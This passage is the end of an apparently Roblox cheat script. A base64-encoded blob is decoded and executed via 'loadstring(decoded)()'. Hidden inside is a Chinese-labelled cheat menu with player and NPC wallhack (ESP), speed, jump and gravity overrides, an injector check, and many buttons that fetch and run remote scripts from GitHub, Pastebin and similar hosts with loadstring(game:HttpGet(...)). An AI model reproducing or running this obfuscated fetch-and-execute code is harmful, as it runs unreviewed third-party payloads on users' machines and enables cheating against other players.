ZFBvcy5ZICsgaGVpZ2h0ICsgNSkKICAgICAgICAgICAgICAgIGVzcC5EaXN0YW5jZS5UZXh0ID0gdG9zdHJpbmcoZGlzdGFuY2UpIC4uICJtIgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBmb3IgbW9kZWwsIGVzcCBpbiBwYWlycyhucGNFc3BDYWNoZSkgZG8KICAgICAgICAgICAgaWYgbm90IG1vZGVsIG9yIG5vdCBtb2RlbC5QYXJlbnQgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhlc3ApIGRvCiAgICAgICAgICAgICAgICAgICAgb2JqLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIG9iajpSZW1vdmUoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBucGNFc3BDYWNoZVttb2RlbF0gPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgbG9jYWwgbnBjRXNwTG9vcAogICAgCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgLS0g6YCP6KeG5Yqf6IO954us56uL5qCH562+6aG1IC0g5Y2H57qn5Li654us56uL5byA5YWz6ZSu54mI5pysCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgbG9jYWwgVGFiNCA9IFdpbmRvdzpDcmVhdGVUYWIoIumAj+inhuWKn+iDvSIsIDc3MzM5NjE3NDkpCiAgICAKICAgIFRhYjQ6Q3JlYXRlU2VjdGlvbigi546p5a626YCP6KeG6K6+572uIikKICAgIFRhYjQ6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuWQr+eUqOeOqeWutumAj+inhiIsIAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGVzcFNldHRpbmdzLmVuYWJsZWQsIAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgICAgICAgICAgZXNwU2V0dGluZ3MuZW5hYmxlZCA9IHYKICAgICAgICAgICAgaWYgdiB0aGVuCiAgICAgICAgICAgICAgICBpZiBub3QgZXNwTG9vcCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZXNwTG9vcCA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdCh1cGRhdGVFU1ApCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgaWYgZXNwTG9vcCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZXNwTG9vcDpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICBlc3BMb29wID0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGZvciBwbHIsIGVzcCBpbiBwYWlycyhlc3BDYWNoZSkgZG8KICAgICAgICAgICAgICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKGVzcCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBvYmo6UmVtb3ZlKCkgZW5kKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB0YWJsZS5jbGVhcihlc3BDYWNoZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRhYjQ6Q3JlYXRlU2VjdGlvbigi546p5a626YCP6KeG5YWD57SgIikKICAgIFRhYjQ6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuaYvuekuuaWueahhiIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZXNwU2V0dGluZ3Muc2hvd0JveCwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIGVzcFNldHRpbmdzLnNob3dCb3ggPSB2CiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRhYjQ6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuaYvuekuuWQjeWtlyIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZXNwU2V0dGluZ3Muc2hvd05hbWUsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBlc3BTZXR0aW5ncy5zaG93TmFtZSA9IHYKICAgICAgICBlbmQKICAgIH0pCgogICAgVGFiNDpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5pi+56S66Led56a7IiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBlc3BTZXR0aW5ncy5zaG93RGlzdGFuY2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBlc3BTZXR0aW5ncy5zaG93RGlzdGFuY2UgPSB2CiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRhYjQ6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuaYvuekuuihgOadoSIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZXNwU2V0dGluZ3Muc2hvd0hlYWx0aEJhciwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIGVzcFNldHRpbmdzLnNob3dIZWFsdGhCYXIgPSB2CiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRhYjQ6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuaYvuekuuihgOmHj+aWh+WtlyIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZXNwU2V0dGluZ3Muc2hvd0hlYWx0aFRleHQsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBlc3BTZXR0aW5ncy5zaG93SGVhbHRoVGV4dCA9IHYKICAgICAgICBlbmQKICAgIH0pCgogICAgVGFiNDpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5pi+56S66L+96Liq57q/5p2hIiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBlc3BTZXR0aW5ncy5zaG93VHJhY2VyLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgICAgICAgICAgZXNwU2V0dGluZ3Muc2hvd1RyYWNlciA9IHYKICAgICAgICBlbmQKICAgIH0pCgogICAgVGFiNDpDcmVhdGVEcm9wZG93bih7CiAgICAgICAgTmFtZSA9ICLnur/mnaHkvY3nva4iLAogICAgICAgIE9wdGlvbnMgPSB7IlRvcCIsICJCb3R0b20ifSwKICAgICAgICBDdXJyZW50T3B0aW9uID0gZXNwU2V0dGluZ3MudHJhY2VyUG9zaXRpb24sCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICAgICAgZXNwU2V0dGluZ3MudHJhY2VyUG9zaXRpb24gPSB2YWx1ZQogICAgICAgIGVuZAogICAgfSkKCiAgICBUYWI0OkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLlj6rmmL7npLrmlYzkuroiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGVzcFNldHRpbmdzLnNob3dFbmVteU9ubHksCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBlc3BTZXR0aW5ncy5zaG93RW5lbXlPbmx5ID0gdgogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiNDpDcmVhdGVTZWN0aW9uKCJOUEPpgI/op4borr7nva4iKQogICAgVGFiNDpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5ZCv55SoTlBD6YCP6KeGIiwgCiAgICAgICAgQ3VycmVudFZhbHVlID0gbnBjRXNwU2V0dGluZ3MuZW5hYmxlZCwgCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBucGNFc3BTZXR0aW5ncy5lbmFibGVkID0gdgogICAgICAgICAgICBpZiB2IHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBucGNFc3BMb29wIHRoZW4KICAgICAgICAgICAgICAgICAgICBucGNFc3BMb29wID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikuUmVuZGVyU3RlcHBlZDpDb25uZWN0KHVwZGF0ZU5wY0VTUCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBpZiBucGNFc3BMb29wIHRoZW4KICAgICAgICAgICAgICAgICAgICBucGNFc3BMb29wOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgIG5wY0VzcExvb3AgPSBuaWwKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZm9yIG1vZGVsLCBlc3AgaW4gcGFpcnMobnBjRXNwQ2FjaGUpIGRvCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhlc3ApIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgb2JqOlJlbW92ZSgpIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFibGUuY2xlYXIobnBjRXNwQ2FjaGUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiNDpDcmVhdGVTZWN0aW9uKCJOUEPpgI/op4blhYPntKAiKQogICAgVGFiNDpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5pi+56S65pa55qGGIiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBucGNFc3BTZXR0aW5ncy5zaG93Qm94LAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgICAgICAgICAgbnBjRXNwU2V0dGluZ3Muc2hvd0JveCA9IHYKICAgICAgICBlbmQKICAgIH0pCgogICAgVGFiNDpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5pi+56S65ZCN5a2XIiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBucGNFc3BTZXR0aW5ncy5zaG93TmFtZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIG5wY0VzcFNldHRpbmdzLnNob3dOYW1lID0gdgogICAgICAgIGVuZAogICAgfSkKCiAgICBUYWI0OkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLmmL7npLrot53nprsiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IG5wY0VzcFNldHRpbmdzLnNob3dEaXN0YW5jZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIG5wY0VzcFNldHRpbmdzLnNob3dEaXN0YW5jZSA9IHYKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICAtLSDkuInplIHlrprvvJrnp7vpgJ8gLyDot7Pot4MgLyDph43lipsKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICBsb2NhbCBsb2NrU3BlZWQsIGxvY2tKdW1wLCBsb2NrR3JhdiA9IGZhbHNlLCBmYWxzZSwgZmFsc2UKICAgIGxvY2FsIHNhdmVkU3BlZWQsIHNhdmVkSnVtcCwgc2F2ZWRHcmF2ID0gMTYsIDUwLCAxOTYKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gYXBwbHlWYWx1ZXMoKQogICAgICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBub3QgY2hhciB0aGVuIHJldHVybiBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBodW0gPSBjaGFyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgIGlmIG5vdCBodW0gdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgaWYgbG9ja1NwZWVkIHRoZW4gaHVtLldhbGtTcGVlZCA9IHNhdmVkU3BlZWQgZW5kCiAgICAgICAgaWYgbG9ja0p1bXAgdGhlbiBodW0uSnVtcFBvd2VyID0gc2F2ZWRKdW1wIGVuZAogICAgICAgIGlmIGxvY2tHcmF2IHRoZW4gd29ya3NwYWNlLkdyYXZpdHkgPSBzYXZlZEdyYXYgZW5kCiAgICBlbmQKICAgIAogICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICBhcHBseVZhbHVlcygpCiAgICBlbmQpCiAgICAKICAgIFRhYjI6Q3JlYXRlU2VjdGlvbigi5LiJ6ZSB5a6aIikKICAgIFRhYjI6Q3JlYXRlSW5wdXQoewogICAgICAgIE5hbWUgPSAi6K6+5a6a56e76YCf77yI5LuF5L+d5a2Y5YC877yJIiwgCiAgICAgICAgUGxhY2Vob2xkZXJUZXh0ID0gdG9zdHJpbmcoc2F2ZWRTcGVlZCksCiAgICAgICAgUmVtb3ZlVGV4dEFmdGVyRm9jdXNMb3N0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0eHQpIAogICAgICAgICAgICBzYXZlZFNwZWVkID0gdG9udW1iZXIodHh0KSBvciAxNiAKICAgICAgICAgICAgYXBwbHlWYWx1ZXMoKQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVJbnB1dCh7CiAgICAgICAgTmFtZSA9ICLorr7lrprot7Pot4Ppq5jluqbvvIjku4Xkv53lrZjlgLzvvIkiLCAKICAgICAgICBQbGFjZWhvbGRlclRleHQgPSB0b3N0cmluZyhzYXZlZEp1bXApLAogICAgICAgIFJlbW92ZVRleHRBZnRlckZvY3VzTG9zdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odHh0KSAKICAgICAgICAgICAgc2F2ZWRKdW1wID0gdG9udW1iZXIodHh0KSBvciA1MCAKICAgICAgICAgICAgYXBwbHlWYWx1ZXMoKQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVJbnB1dCh7CiAgICAgICAgTmFtZSA9ICLorr7lrprph43lipvlgLzvvIjku4Xkv53lrZjlgLzvvIkiLCAKICAgICAgICBQbGFjZWhvbGRlclRleHQgPSB0b3N0cmluZyhzYXZlZEdyYXYpLAogICAgICAgIFJlbW92ZVRleHRBZnRlckZvY3VzTG9zdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odHh0KSAKICAgICAgICAgICAgc2F2ZWRHcmF2ID0gdG9udW1iZXIodHh0KSBvciAxOTYgCiAgICAgICAgICAgIGFwcGx5VmFsdWVzKCkKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjI6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIumUgeWumuenu+mAnyIsIAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLCAKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIAogICAgICAgICAgICBsb2NrU3BlZWQgPSB2CiAgICAgICAgICAgIGFwcGx5VmFsdWVzKCkKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjI6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIumUgeWumui3s+i3gyIsIAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLCAKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIAogICAgICAgICAgICBsb2NrSnVtcCA9IHYKICAgICAgICAgICAgYXBwbHlWYWx1ZXMoKQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi6ZSB5a6a6YeN5YqbIiwgCiAgICAgICAgQ3VycmVudFZhbHVlID0gZmFsc2UsIAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikgCiAgICAgICAgICAgIGxvY2tHcmF2ID0gdgogICAgICAgICAgICBhcHBseVZhbHVlcygpCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICAtLSBWUuiEmuacrCBUYWIKICAgIGxvY2FsIFRhYjUgPSBXaW5kb3c6Q3JlYXRlVGFiKCJWUiIsIDc3MzM3Nzk2MTApCiAgICBUYWI1OkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICJGRVZS6ISa5pysIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYW5kb21zdHJpbmcwL1F3ZXJ0eS9yZWZzL2hlYWRzL21haW4vcXdlcnR5NDUubHVhIikpKCkKICAgIGVuZH0pCgogICAgLS0g5o6n5Yi25Y+wIFRhYgogICAgbG9jYWwgVGFiNiA9IFdpbmRvdzpDcmVhdGVUYWIoIuaOp+WItuWPsCIsIDc3MzM3Nzk2MTApCiAgICBUYWI2OkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICLmjqfliLblj7DohJrmnKwiLCBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3l4Z2gxNjUveXhnaDE2NS9tYWluLzY2NiIpKSgpCiAgICBlbmR9KQogICAgCiAgICAtLSBYQeiEmuacrCBUYWIKICAgIGxvY2FsIFRhYjcgPSBXaW5kb3c6Q3JlYXRlVGFiKCJYQeiEmuacrCIsIDc3MzM3Nzk2MTApCiAgICBUYWI3OkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICJYQSBIVUIiLCBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0Y29kZS5jb20vWGluZ3RhaWR1YW4vU2NyaXB0cy9yYXcvbWFpbi9Mb2FkZXIubHVhIikpKCkKICAgIGVuZH0pCiAgICAKICAgIC0tIFJC6ISa5pys5Lit5b+DIFRhYgogICAgbG9jYWwgVGFiOCA9IFdpbmRvdzpDcmVhdGVUYWIoIlJC6ISa5pysIiwgNzczMzc3OTYxMCkKICAgIFRhYjg6Q3JlYXRlQnV0dG9uKHtOYW1lID0gIlJi6ISa5pysIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ZdW5nZW5neGluL3JvYmxveC9yZWZzL2hlYWRzL21haW4vUmItSHViIikpKCkKICAgIGVuZH0pCiAgICAKICAgIC0tIOeUn+WtmOS4juadgOaJiyBUYWIKICAgIGxvY2FsIFRhYjkgPSBXaW5kb3c6Q3JlYXRlVGFiKCLnlJ/lrZjkuI7mnYDmiYsiLCA3NzMzNzc5NjEwKQogICAgVGFiOTpDcmVhdGVCdXR0b24oe05hbWUgPSAi55Sf5a2Y5LiO5p2A5omLIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NaWxhbjA4U3R1ZGlvL0NoYWlyV2FyZS9tYWluL21haW4ubHVhIikpKCkKICAgIGVuZH0pCiAgICAKICAgIC0tIOeIseW+t+WNjiBUYWIKICAgIGxvY2FsIFRhYjEwID0gV2luZG93OkNyZWF0ZVRhYigi54ix5b635Y2OIiwgNzczMzc3OTYxMCkKICAgIFRhYjEwOkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICLniLHlvrfljY4iLCBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2d1bWFuYmEvU2NyaXB0cy9tYWluL0Vkd2FyZCIpKSgpCiAgICBlbmR9KQogICAgCiAgICAtLSDmtLvkuoY35aSpIFRhYgogICAgbG9jYWwgVGFiMTEgPSBXaW5kb3c6Q3JlYXRlVGFiKCLmtLvkuoY35aSpIiwgNzczMzc3OTYxMCkKICAgIFRhYjExOkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICLmtLvkuoY35aSpIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3c2NyaXB0cy5uZXQvcmF3L1VuaXZlcnNhbC1TY3JpcHQtNy1kYXlzLXRvLWxpdmUtMzY4MjQiKSkoKQogICAgZW5kfSkKICAgIAogICAgLS0g5q276ZOB6L2oIFRhYgogICAgbG9jYWwgVGFiMTIgPSBXaW5kb3c6Q3JlYXRlVGFiKCLmrbvpk4HovagiLCA3NzMzOTc5NjEwKQogICAgVGFiMTI6Q3JlYXRlQnV0dG9uKHtOYW1lID0gIuatu+mTgei9qCIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaW9wamtsYm5tc3NzL1NhbnNIdWJTY3JpcHQvcmVmcy9oZWFkcy9tYWluL1NhbnNIdWIiKSkoKQogICAgZW5kfSkKCiAgICAtLSDkuIDot6/lkJHopb/liLfpkrEgVGFiCiAgICBsb2NhbCBUYWIxMyA9IFdpbmRvdzpDcmVhdGVUYWIoIuS4gOi3r+WQkeilvyIsIDc3MzM5Nzk2MTApCiAgICBUYWIxMzpDcmVhdGVCdXR0b24oe05hbWUgPSAi5LiA6Lev5ZCR6KW/5Yi36ZKxIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS95eGdoMTY1L3l4Z2gxNjUvbWFpbi/kuIDot6/lkJHopb8iKSkoKQogICAgZW5kfSkKICAgICAgICAKICAgIC0tIOiHqueEtueBvuWusyBUYWIKICAgIGxvY2FsIFRhYjE0ID0gV2luZG93OkNyZWF0ZVRhYigi6Ieq54S254G+5a6zIiwgNzczMzk3OTYxMCkKICAgIFRhYjE0OkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICLoh6rnhLbngb7lrrPpu5HmtJ52NiIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhd3NjcmlwdHMubmV0L3Jhdy9Vbml2ZXJzYWwtU2NyaXB0LVN1cGVyLXJpbmctUGFydHMtVjYtMjg1ODEiKSkoKQogICAgZW5kfSkKCi0tIOS/hOS6peS/hOW3niBUYWIKICAgIGxvY2FsIFRhYjE1ID0gV2luZG93OkNyZWF0ZVRhYigi5L+E5Lql5L+E5beeIiwgNzczMzk3OTYxMCkKICAgIFRhYjE1OkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICJYQeS/hOS6peS/hOW3niIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWGluZ3RhaWR1YW4vU2NyaXB0L3JlZnMvaGVhZHMvbWFpbi9HYW1lcy/kv4TkuqXkv4Tlt54ubHVhIikpKCkKICAgIGVuZH0pCgotLSDloqjmsLTmuLjmiI8gVGFiCiAgICBsb2NhbCBUYWIxNiA9IFdpbmRvdzpDcmVhdGVUYWIoIuWiqOawtOa4uOaIjyIsIDc3MzM5Nzk2MTApCiAgICBUYWIxNjpDcmVhdGVCdXR0b24oe05hbWUgPSAiWEHloqjmsLTmuLjmiI8iLCBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hpbmd0YWlkdWFuL1NjcmlwdC9yZWZzL2hlYWRzL21haW4vR2FtZXMv5aKo5rC05ri45oiPLmx1YSIpKSgpCiAgICBlbmR9KQoKLS0gOTnlpJwgVGFiCiAgICBsb2NhbCBUYWIxNyA9IFdpbmRvdzpDcmVhdGVUYWIoIjk55aScIiwgNzczMzk3OTYxMCkKICAgIFRhYjE3OkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICJYQTk55aScIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9YaW5ndGFpZHVhbi9TY3JpcHQvcmVmcy9oZWFkcy9tYWluL0dhbWVzL+ajruael+S4reeahDk55aScLmx1YSIpKSgpCiAgICBlbmR9KQoKLS0gZG9vcnMgVGFiCiAgICBsb2NhbCBUYWIxOCA9IFdpbmRvdzpDcmVhdGVUYWIoImRvb3JzIiwgNzczMzk3OTYxMCkKICAgIFRhYjE4OkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICJkb29yc+axieWMliIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvNjVUd1Q4amEiKSkoKQogICAgZW5kfSkKCi0tIOeDguail+ekvuWMuiBUYWIKICAgIGxvY2FsIFRhYjE5ID0gV2luZG93OkNyZWF0ZVRhYigi54OC5qKX56S+5Yy6IiwgNzczMzk3OTYxMCkKICAgIFRhYjE5OkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICLng4LmopfnpL7ljLrliLfpkrEiLCBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hPVFJYT05ZL0Vhc3lTY3JpcHQvbWFpbi9TdWFvLmx1YXUnKSkoKQogICAgZW5kfSkKCiAgICAtLSDorr7nva5UYWIKICAgIGxvY2FsIFRhYjIwID0gV2luZG93OkNyZWF0ZVRhYigi6K6+572uIiwgNzczMzc3OTYxMCkKICAgIFRhYjIwOkNyZWF0ZUJ1dHRvbih7CiAgICAgICAgTmFtZSA9ICLkuIDplK7lpI3liLZEaXNjb3Jk6ZO+5o6lIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgZGlzY29yZExpbmsgPSAiaHR0cHM6Ly9kaXNjb3JkLmdnL3hWVWY3SDlNIgogICAgICAgICAgICBsb2NhbCBzdWNjZXNzID0gQ29weVRvQ2xpcGJvYXJkKGRpc2NvcmRMaW5rKQogICAgICAgICAgICBTaG93Q29weU5vdGlmaWNhdGlvbihzdWNjZXNzLCBkaXNjb3JkTGluaykKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIC0tIOW/jeiAheazqOWFpeWZqOWFvOWuueaAp+ajgOafpQogICAgaWYgaWRlbnRpZnlleGVjdXRvciBhbmQgaWRlbnRpZnlleGVjdXRvcigpOmxvd2VyKCk6ZmluZCgibmluamEiKSB0aGVuCiAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAi5rOo5YWl5Zmo5qOA5rWLIiwKICAgICAgICAgICAgQ29udGVudCA9ICLlv43ogIXms6jlhaXlmajlt7Lor4bliKvvvIzmiYDmnInlip/og73lhbzlrrkiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OAogICAgICAgIH0pCiAgICBlbmQKICAgIAogICAgLS0g6aqM6K+B6YCa6L+H5ZCO5pKt5pS+5Yqo55S7CiAgICBDcmVhdGVLdW5LdW5BbmltYXRpb24oKQplbmQKCi0tIOebtOaOpeWIm+W7uuS4u+eql+WPo+WGheWuuQpDcmVhdGVNYWluV2luZG93Q29udGVudCgp")
loadstring(decoded)()
